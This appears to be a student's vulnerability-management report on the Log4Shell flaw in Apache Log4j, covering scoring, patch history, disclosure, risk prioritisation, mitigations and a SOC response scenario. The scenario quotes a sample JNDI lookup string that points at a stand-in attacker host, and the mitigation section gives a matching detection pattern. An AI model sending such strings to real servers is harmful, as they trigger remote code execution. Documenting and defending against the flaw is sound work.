# CVE-2021-44228 - Log4Shell

skills: Vulnerability Analysis, CVE Documentation, CVSS Scoring, Risk Assessment, Threat Intelligence
tools: NVD, MITRE CVE, CISA KEV, CVSS Calculator, EPSS

**CVE REPORT** · May 26, 2026

A complete vulnerability analysis prepared as part of a Vulnerability Management Learning Portfolio.

## Why I Documented This CVE

I practiced documenting CVE-2021-44228 because Log4Shell is a good example of how vulnerability analysis goes beyond copying a severity score. The report forced me to explain what happened, which component was affected, why the score was 10.0, how the patch story changed over time, and what a SOC would actually do when exploitation starts.

---

## Section 1 - CVE Overview

| Field | Value |
|-------|-------|
| CVE ID | CVE-2021-44228 |
| Common Name | Log4Shell |
| Discovered By | Chen Zhaojun, Alibaba Cloud Security Team |
| Publicly Disclosed | December 10, 2021 |
| Vendor | Apache Software Foundation |
| Affected Component | log4j-core only |

Log4j is a logging tool for Java. Developers plug it into their applications to record events, system errors, and diagnostic messages - think of it as a diary that an application keeps about everything happening inside it. It was used everywhere. Amazon, Apple, Microsoft, Tesla, Twitter, government systems - millions of applications worldwide depended on it.

The vulnerability worked like this. When Log4j recorded a message, it didn't just save it as plain text. It also processed certain special patterns inside those messages and acted on them. An attacker could send a specially crafted string - something as simple as a username field in a login form - and if that string got logged by Log4j, it would instruct the server to reach out to an attacker-controlled server and execute whatever code was waiting there. No password needed. No account needed. No action required from the victim. Just send the string, and the server hands over control.

The impact was immediate and global. Exploitation attempts began within hours of public disclosure. Over 800,000 exploitation attempts were recorded in the first 72 hours. Governments in the US, UK, Canada, Australia, and New Zealand issued joint advisories. The US government mandated federal agencies patch within 14 days - with a Christmas Eve deadline.

---

## Section 2 - Affected Software

The vulnerability lives specifically in the `log4j-core` JAR file. This is important - applications using only the `log4j-api` JAR file are not affected. When scanning your environment, you are looking for `log4j-core`, not just any Log4j file.

The affected versions span three separate ranges:

- 2.0-beta9 through 2.3.1
- 2.4 through 2.12.2
- 2.13.0 through 2.15.0

**Fix versions by Java version:**

- Java 6 users need to upgrade to 2.3.1
- Java 7 users need to upgrade to 2.12.2
- Java 8 and later users need to upgrade to 2.15.0 - but this gets complicated. See Section 5 for the full patch story.

**Log4j 1.x:** Log4j 1.x is a separate situation. It reached End of Life in 2015 and has no supported patch path. Organizations still running Log4j 1.x had no choice but to do a full upgrade to Log4j 2. A separate CVE - CVE-2021-4104 - was filed for the Log4j 1.x variant of this issue.

---

## Section 3 - CVSS Analysis

| Metric | Value |
|--------|-------|
| CVSS Version | 3.1 |
| Base Score | **10.0 CRITICAL** |
| Vector String | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Scored By | NIST/NVD and CISA-ADP independently - both confirmed 10.0 with identical vector strings |

When two authoritative bodies independently score a CVE and arrive at the same result, the score is reliable. There is no ambiguity here.

A CVSS score of 10.0 is extremely rare. It means every single factor scored at worst case - there is literally no condition that makes this vulnerability harder to exploit or less impactful.

**Plain-language vector breakdown:**

- **AV:N - Network.** The attacker can exploit this from anywhere on the internet. This is the worst possible attack vector.
- **AC:L - Low complexity.** There are no special conditions required. Just send the string.
- **PR:N - No privileges required.** The attacker needs no account, password, or prior access.
- **UI:N - No user interaction.** The victim does not need to click a link, open a file, or do anything at all.
- **S:C - Scope changed.** Exploitation jumps beyond Log4j and gives control of the underlying server.
- **C:H - High confidentiality impact.** All data on the server can be exposed.
- **I:H - High integrity impact.** The attacker can modify data, alter configurations, and plant backdoors.
- **A:H - High availability impact.** The attacker can take the entire system offline.

Every single factor is worst case. That is why the score is 10.0.

**Other scoring systems used alongside CVSS:**

- **EPSS** - Exploit Prediction Scoring System. Predicts the probability that a vulnerability will be exploited in the next 30 days, on a scale of 0 to 1. For Log4Shell, EPSS scored near 1.0 - meaning near certain exploitation. High CVSS combined with high EPSS means patch immediately with no exceptions.
- **VPR** - Vulnerability Priority Rating. Tenable's own scoring system used in Nessus reports. It combines CVSS score, threat intelligence, and asset context into one actionable number. You will see this in Nessus scan reports when scanning for Log4Shell.

---

## Section 4 - Weakness Enumeration

CWE stands for Common Weakness Enumeration. If CVE is the specific vulnerability, CWE is the category of weakness that caused it. Log4Shell has four CWEs assigned.

| CWE | Explanation |
|-----|-------------|
| CWE-917 | Improper Neutralization of Special Elements in Expression Language. This is the root cause. Log4j processed special characters and patterns inside log messages as executable commands instead of treating them as plain text. |
| CWE-20 | Improper Input Validation. Log4j did not validate whether the content it was about to log was safe. It accepted whatever was given to it and processed it without checking. |
| CWE-400 | Uncontrolled Resource Consumption. As a side effect of exploitation, the lookup process could consume excessive system resources. |
| CWE-502 | Deserialization of Untrusted Data. When Log4j fetched content from the attacker's external server, it deserialized - unpacked and executed - that content without verifying it was safe. |

Root cause in plain English: Log4j trusted and acted on whatever input it received without checking whether it was safe. Attackers exploited this by embedding malicious instructions inside ordinary log messages.

---

## Section 5 - The Patch Story and Related CVEs

This section is critical because Log4Shell is not a single CVE with a single fix. It is a family of vulnerabilities that unfolded over weeks, with each attempted fix revealing new problems.

When you searched CVE-2021-44228 on NVD you got 7 results - not 1. That is because one major vulnerability can spawn an entire family of related CVEs.

**Round 1 - CVE-2021-44228, Fixed in 2.15.0 (December 10)**

Apache's first fix restricted JNDI lookups but only disabled them by default in certain configurations. Non-default configurations remained vulnerable. Organizations that patched to 2.15.0 thought they were safe. They were not.

**Round 2 - CVE-2021-45046, Fixed in 2.16.0 (December 18)**

Researchers discovered that 2.15.0 was incomplete. The fix could be bypassed using non-default Thread Context Map patterns. Apache released 2.16.0 which disabled JNDI entirely by default. CISA also added CVE-2021-45046 to the KEV catalog - meaning this bypass was also being actively exploited in the wild. Organizations had to patch again.

**Round 3 - CVE-2021-45105, Fixed in 2.17.0 (December 28)**

A denial of service vulnerability was found in 2.16.0 itself. An attacker could craft a string that caused infinite recursion in Log4j's string substitution, crashing the logging system entirely. Fixed in 2.17.0 - the final recommended version.

**Other related CVEs:**

- **CVE-2021-4104** - Log4j 1.x users were not safe either. A separate vulnerability in Log4j 1.x allowed similar exploitation when JMSAppender was configured.
- **CVE-2021-44530** - Ubiquiti's UniFi Network software used Log4j internally and required its own patch cycle.
- **CVE-2021-4125** - Red Hat's patch for OpenShift was incomplete. Not all JndiLookup class files were removed in certain container images.
- **CVE-2022-23848** - Alluxio's logserver was affected.
- **CVE-2022-33915** - Amazon's own hotpatch for Log4Shell introduced a race condition that could lead to local privilege escalation. The fix itself created a new vulnerability.

The lesson for analysts: Never assume the first patch fully closes a critical vulnerability. Rescan after every patch. Track the full CVE family, not just the original CVE ID.

---

## Section 6 - CISA KEV Status

| Field | Value |
|-------|-------|
| Listed in KEV | Yes |
| Date Added | December 10, 2021 - same day as public disclosure |
| Patch Deadline | December 24, 2021 |
| Required Action | Apply patch OR remove affected assets from network. Temporary mitigations are only acceptable until the patch is available. |

CISA adding a CVE to the Known Exploited Vulnerabilities catalog on the same day it goes public is extremely rare. It means confirmed active exploitation - not theoretical risk, not proof of concept code in a lab. Real attackers were using this against real systems on the day it was announced.

The 14 day Christmas Eve deadline tells you everything about how seriously the US government treated this. Federal agencies had no holiday break. Security teams across the country were patching through Christmas.

For private organizations, the KEV catalog is not legally binding - but it is a strong signal. If CISA says a vulnerability is being actively exploited and you have it in your environment unpatched, you have no defensible position when explaining why it was not prioritized.

---

## Section 7 - The Disclosure Failure

Log4Shell's public disclosure did not go cleanly. Understanding what went wrong here shows why responsible disclosure and embargo periods exist.

**What should have happened:**

Chen Zhaojun privately reports to Apache. Apache works on the fix during the embargo period - typically 90 days. When the fix is ready, the vulnerability is publicly disclosed simultaneously with the patch release. Organizations have the patch available the moment they learn about the vulnerability. Coordinated disclosure protects defenders.

**What actually happened:**

- November 24 - Chen Zhaojun privately reports to Apache. Apache begins working on a fix.
- December 9 - Before Apache finished the patch, someone posted a proof of concept exploit on a public GitHub repository. This was not a coordinated disclosure. It leaked early.

This forced Apache's hand. They had to rush the patch out on December 10 - a patch that as we now know was incomplete. Attackers had working exploit code before most organizations even knew the vulnerability existed. The temporal score jumped to maximum the moment the PoC hit GitHub - not when Apache officially disclosed it.

Within hours of the GitHub leak, automated scanning across the internet began. Cloudflare reported seeing exploitation attempts within 2 hours of the PoC becoming public. Check Point recorded over 800,000 exploitation attempts in the first 72 hours.

This is why the embargo period exists. When it breaks down, defenders lose their preparation window entirely.

---

## Section 8 - CVSS vs Risk - Applied to Log4Shell

We have established that Log4Shell has a CVSS base score of 10.0. But as an analyst, the base score is only your starting point. Here is what real risk assessment looks like applied to this specific vulnerability.

**Scenario 1 - Internet-facing customer API running log4j-core 2.14.1**

CVSS base: 10.0. Directly reachable by anyone on the internet. Holds customer PII. No compensating controls in place. Real-world priority: patch within hours. This is your highest risk asset.

**Scenario 2 - Internal HR system running log4j-core 2.14.1, behind firewall**

CVSS base: 10.0. Not internet-facing. Firewall blocks external LDAP traffic. Limited number of internal users can reach it. Real-world priority: patch within days. Still urgent but not the same as Scenario 1.

**Scenario 3 - Developer laptop running a local test instance**

CVSS base: 10.0. No sensitive data. Isolated from production network. No one outside the developer can reach it. Real-world priority: patch within weeks. Low actual risk despite maximum CVSS score.

**Scenario 4 - System using only log4j-api with no log4j-core**

CVSS base: 10.0. Not affected at all. log4j-api does not contain the vulnerable code. Real-world priority: no action needed. Verify and document.

This is why CVSS alone is not a prioritization strategy. It measures the technical severity of the vulnerability in isolation. It does not know your environment, your assets, your compensating controls, or your business context. You do. That is the analyst's job.

---

## Section 9 - Compensating Controls

When a patch cannot be applied immediately - because it needs testing, because the vendor hasn't released one, or because the system is managed by a third party - compensating controls reduce risk while you wait.

**For Log4j 2.10 and above:**

- Set the environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`
- Set the JVM flag `-Dlog4j2.formatMsgNoLookups=true`

These prevent Log4j from processing lookup patterns in log messages. They do not fix the underlying vulnerability but they stop the most common exploitation path.

**For all affected versions:**

- Block outbound LDAP, LDAPS, RMI, DNS, and all JNDI-related traffic at the firewall. The attack requires the vulnerable server to make an outbound connection to the attacker's server. Blocking that outbound traffic breaks the attack chain even if the vulnerability is triggered.
- Deploy a WAF rule to detect and block exploitation strings. Any request containing the pattern `${jndi:` is a Log4Shell exploitation attempt.
- Enable enhanced logging and alerting. Monitor logs for the `jndi` string. If you see it, an exploitation attempt is occurring.

**For systems that cannot be patched or mitigated:**

Isolate from the network entirely. Document this as formal risk acceptance with management sign-off, define a review date, and do not leave it open-ended.

CISA explicitly stated these are temporary measures only. They are not substitutes for patching.

---

## Section 10 - Temporal Timeline

| Date | Event | Analyst Urgency |
|------|-------|----------------|
| November 24, 2021 | Chen Zhaojun privately reports the vulnerability to Apache | Low. Only Apache knows. |
| December 9, 2021 | PoC exploit leaks publicly on GitHub before the patch is ready | Critical immediately. Working exploit code is now available to anyone. |
| December 10, 2021 | Apache releases 2.15.0. CISA adds CVE-2021-44228 to KEV. | Critical. A patch exists but needs testing. Compensating controls must be applied immediately. |
| December 14, 2021 | CVE-2021-45046 filed. The 2.15.0 patch is confirmed incomplete. | Critical. Organizations that already patched to 2.15.0 are not fully protected. |
| December 18, 2021 | Apache releases 2.16.0. JNDI disabled by default. CVE-2021-45105 filed. | High. A solid fix now exists but there is yet another issue to track. |
| December 28, 2021 | Apache releases 2.17.0. Final recommended version. | Medium. The fix is available and stable. |
| January 2022 and beyond | Exploitation continues against unpatched systems worldwide | Medium for any system not yet patched. Attackers continue scanning well into 2022 and 2023. |

---

## Section 11 - What This Looked Like in a Real SOC

On December 10, 2021 a SOC analyst's day looked like this:

Morning - an alert fires in the SIEM. Unusual outbound LDAP traffic from an internal web server. The analyst investigates and finds the string `${jndi:ldap://attacker.com/a}` in the web server's access logs. This is a Log4Shell exploitation attempt.

The analyst checks the server - it runs Log4j-core 2.14.1. Vulnerable. The outbound connection attempt was blocked by the firewall. Exploitation did not succeed this time.

**Immediate actions taken:**

- Escalate to senior analyst and incident response team.
- Apply the JVM flag compensating control to this server immediately.
- Block all outbound LDAP traffic at the firewall for the entire environment.
- Begin asset inventory - run a scan to find every system running a vulnerable version of log4j-core.
- Check firewall logs for any outbound LDAP connections that did succeed before the block was in place.

**If any outbound connections succeeded:**

This is now an incident, not just a vulnerability. Escalate to full incident response. Assume those systems are compromised until proven otherwise. Begin forensic investigation.

**Documentation throughout:**

- Create an incident ticket with a detailed timeline.
- Record all indicators of compromise - attacker IP addresses, JNDI strings seen in logs, timestamps.
- Update the CMDB with Log4j version information discovered during the inventory scan.
- Document every compensating control applied and when.

**Communication to management:**

> A critical vulnerability has been found in a logging component used by millions of applications including ours. An attacker can take complete control of our servers without any password or special access. We identified an exploitation attempt this morning - our firewall blocked it but we are treating this as an active threat. We have applied temporary protections to all affected systems while we test and deploy the official patch. We will provide a full update by end of day.

---

## Section 12 - Vendor Advisory Summary

| Field | Value |
|-------|-------|
| Source | Apache Software Foundation Security Advisory |
| URL | logging.apache.org/log4j/2.x/security.html |
| Discovered by | Chen Zhaojun, Alibaba Cloud Security Team |
| Affected component | log4j-core only. log4j-api is not affected. |
| Fix for Java 6 | Upgrade to 2.3.1 |
| Fix for Java 7 | Upgrade to 2.12.2 |
| Fix for Java 8 and later | Upgrade to 2.15.0, then 2.16.0, final recommended version is 2.17.0 |
| Log4j 1.x | No patch available. End of Life since 2015. Full upgrade to Log4j 2 is required. |

---

## Section 13 - Sources

| Source | Used For |
|--------|----------|
| NVD - nvd.nist.gov/vuln/detail/CVE-2021-44228 | CVE facts, CVSS score, vector string, CWE enumeration |
| MITRE - cve.mitre.org | Official CVE description and cross-reference |
| Apache Software Foundation - logging.apache.org/log4j/2.x/security.html | Affected versions, fix versions, discoverer, vendor perspective |
| CISA KEV - cisa.gov/known-exploited-vulnerabilities-catalog | KEV listing, patch deadline, required actions |
| CISA Advisory AA21-356A - cisa.gov/news-events/cybersecurity-advisories/aa21-356a | Real world scope, compensating controls, government response |

---

## The Analyst Lesson

The most useful lesson was that Log4Shell was not just one CVE with one clean fix. The first patch was incomplete, follow-up CVEs appeared, vendors had their own patch issues, and defenders had to rescan repeatedly. That is exactly the kind of detail an analyst needs to track during a real incident.

The report also made the difference between CVSS and risk clearer. CVSS says the vulnerability is technically critical. Risk depends on whether the system is internet-facing, what data it holds, whether outbound traffic is blocked, and whether the application actually uses log4j-core.

Writing the report helped me practice turning technical facts into analyst judgment: explain the root cause, identify affected assets, validate whether a system is actually vulnerable, prioritize exposed assets first, apply temporary controls when patching cannot happen immediately, and document the whole timeline clearly.
